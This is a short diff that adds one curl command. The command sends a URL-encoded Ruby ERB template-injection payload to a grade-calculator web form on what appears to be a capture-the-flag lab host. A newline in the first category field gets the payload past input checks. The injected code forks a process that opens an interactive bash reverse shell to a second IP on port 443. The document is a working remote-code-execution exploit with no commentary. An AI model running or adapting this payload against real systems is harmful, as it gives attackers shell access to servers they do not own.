@@ -1,0 +1,4 @@
+curl -s -X POST 'http://10.129.229.121/weighted-grade-calc' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-raw 'category1=test%0A%3C%25%3D%20pid%3Dfork%7Bexec(%22bash%22%2C%22-c%22%2C%22bash%20-i%20%3E%26%20/dev/tcp/10.10.16.187/443%200%3E%261%22)%7D%3BProcess.detach(pid)%3B%22spawned%22%20%25%3E&grade1=20&weight1=20&category2=a&grade2=20&weight2=20&category3=a&grade3=20&weight3=20&category4=a&grade4=20&weight4=20&category5=a&grade5=20&weight5=20' \
+  | grep -A1 'Your total grade'
